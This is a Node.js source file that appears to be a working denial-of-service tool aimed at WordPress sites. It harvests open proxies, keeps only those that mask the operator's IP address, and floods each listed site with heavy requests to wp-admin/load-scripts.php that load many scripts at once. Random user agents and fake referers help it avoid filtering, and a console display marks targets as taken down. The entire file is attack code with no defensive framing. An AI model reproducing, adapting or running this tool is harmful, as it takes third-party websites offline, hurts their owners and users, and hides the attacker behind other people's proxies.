/**
 * Config target host
 * 
 * 
 */
var targetVersion = '4.9',
    countries = ['bg'],
    wanCheckUrl = 'http://your-proxy-checker.com/check',
    requestTimeout = 3000,
    maxRequests = 50000; //0 = Unlimited


/**
 * Set max IO operations, so we do not see warning during execution
 * 
 */

process.setMaxListeners(maxRequests);
require('events').EventEmitter.defaultMaxListeners = maxRequests;

var request = require('request'),
    userAgents = require('./userAgents'),
    fileList = require('./fileList'),
    websiteList = require('./websites'),
    fs = require('fs'),
    websiteStatusList = [];


for(var a in websiteList){
    websiteStatusList.push(true);
}
var proxyList = [];

var wanIp = //Will be determined automaticaly or assign it manualy
    gettingProxies = null, // `gettingProxies` is an event emitter object.
    currentRequestCount = 
    currentWebsiteIndex = 0

function getWAN(){
    request({
        'url': wanCheckUrl,
        timeout: requestTimeout
    
    }, function (error, response, body) {
        if (!error && response && response.statusCode == 200 && body && body !== 'Unauthorized') {
            var result = body.split(':');
            wanIp = result[result.length - 1];

            if(!gettingProxies){
                initProxyListener();
                //Init processor
                processor();
            }
                
        }
        else{
            console.error('Unable to get public WAN', error);
            process.exit(1);
        }
    })
}

// TODO: 
//destroy the old gettingProxies
function initProxyListener(){
    if(gettingProxies){        
        gettingProxies = null;
    }

    gettingProxies = require('proxy-lists').getProxies({
        countries: countries,
        protocols: ['http', 'https']
    });

    gettingProxies.on('data', function(proxies) {
        for(var a in proxies){
            processRawProxy(proxies[a])
        }    
    });
    
    gettingProxies.on('error', function(error) {
        // console.error(error);
    });
    
    gettingProxies.once('end', function() {
        console.log('Stopped listening for proxies. Currently there are ' + proxyList.length + ' proxies in memory')
    });
}

function processRawProxy(proxy){
    var req = request({
        'url': wanCheckUrl,
        'proxy': 'http://' + proxy.ipAddress + ':' + proxy.port,
        timeout: requestTimeout
    
    }, function (error, response, body) {
        if (!error && response && response.statusCode == 200) {
            if(body && body.indexOf(wanIp) <= -1 && body !== 'Unauthorized')
                proxyList.push(proxy)
        }
    })
    //Do not remove this handler, as ECONNRESET is killing the process
    req.on("error", function(err) {});
}

function callWithProxy(proxy){
    var currentWebsite = websiteList[currentWebsiteIndex];

    var options = {
        url: currentWebsite + '/wp-admin/load-scripts.php?c=1&load%5B%5D=' + fileList.join(',') + '&ver=' + targetVersion,
        'proxy':'http://' + proxy.ipAddress + ':' + proxy.port,
        headers: {
            'User-Agent': userAgents[getRandomInt(0,userAgents.length -1)],
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Referer': 'http://www.google.com/?q=' + getRandomStr(getRandomInt(5,10)),
            'Keep-Alive': getRandomInt(110,120),
            'Connection': 'keep-alive'
        }
    }

    currentRequestCount++;

    currentWebsiteIndex = currentWebsiteIndex >= websiteList.length - 1 ? 0 : currentWebsiteIndex + 1;

    var currentLocalIndex = currentWebsiteIndex.valueOf();

    var req = request(options, function (error, response, body) {
        currentRequestCount--;

        if(error){
            //Decide if the proxy has gone dead or just the site is under DDoS.
            ///Uncommenting this line means, proxy will be removed for next requests
            //until the list is empty again and restart the proxy scan.

            // removeProxy(proxy);
        }
        else{
            var isAlive = response && response.statusCode == 200;
            websiteStatusList[currentLocalIndex] = isAlive;
        }
    })

    //Do not remove this handler, as ECONNRESET is killing the process
    req.on("error", function(err) {});
}

function getRandomInt(min, max){
    return ~~(Math.random() * (max - min) + min)
}

function getRandomStr(size){
    var out_str = '';
	for(var a = 0; a < size; a++){
		var b = getRandomInt(65, 90)
        out_str += String.fromCharCode(b)
    }
	return(out_str)
}

function processor(){
    setTimeout(function(){
        if(maxRequests === 0 || maxRequests !==0 && currentRequestCount < maxRequests){

            var websiteStatuses = '';
            var deadCount = 0;
            for(var a = 0; a < websiteList.length; a++){
                websiteStatuses += (websiteStatusList[a] ? ('\x1b[32m' + websiteList[a] + '\x1b[0m') : ('\x1b[31m' + websiteList[a] + '\x1b[0m'));
                websiteStatuses += '\n\r';
                if(!websiteStatusList[a]) deadCount++;
            }

            var status = 'Status DDoS: ' + websiteList.length + ' websites :  ' + (proxyList.length === 0 ? 'scanning ' : proxyList.length) + ' proxies : ' + currentRequestCount + ' requests\n\r';
                status += 'Alive: ' + (websiteList.length - deadCount) + ' DDoS: ' + deadCount + '\n\r';
            
            status += websiteStatuses;
            
            writeOnSingleLine(status);
            
            for(var a in proxyList){
                callWithProxy(proxyList[a]);
            }
        }        
        processor();
    }, 1)
}

function removeProxy(proxy){
    for(var a in proxyList){
        if(proxyList[a].ipAddress === proxy.ipAddress
            && proxyList[a].port === proxy.port){
                proxyList.splice(a, 1);
                if(proxyList.length === 0){
                    initProxyListener();
                }
                return true;
            }
    }
    return false;
}

function writeOnSingleLine(msg){
    // fs.writeFile('output.txt', msg, { flag : 'w' }, (err) => {
    //     if (err) throw err;
    //         // console.log('The file has been saved!');
    //     });
    process.stdout.clearLine();
    process.stdout.cursorTo(0); 
    process.stdout.write(msg);
}

getWAN();